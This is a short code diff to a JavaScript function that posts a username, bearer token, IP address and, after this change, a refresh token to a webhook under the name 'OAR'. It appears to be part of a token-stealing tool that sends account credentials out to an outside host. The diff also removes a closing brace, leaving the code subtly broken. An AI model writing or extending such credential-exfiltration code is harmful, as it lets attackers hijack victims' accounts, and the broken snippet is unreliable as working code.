@@ -313,7 +313,8 @@ async function postToWebhook(
     username,
     bearerToken,
     ip,
-    webhook
+    webhook,
+    refreshToken,
 ) {
     data = {
         username: "OAR",
@@ -339,9 +340,8 @@ async function postToWebhook(
                         value: "```" + bearerToken + "```",
                     },
                     {
-                        name: "**refreshToken**"
+                        name: "**RefreshToken**",
                         value: "```" + refreshToken + "```",
-                    },
                 ],
                 footer: {
                     text: "OAR",
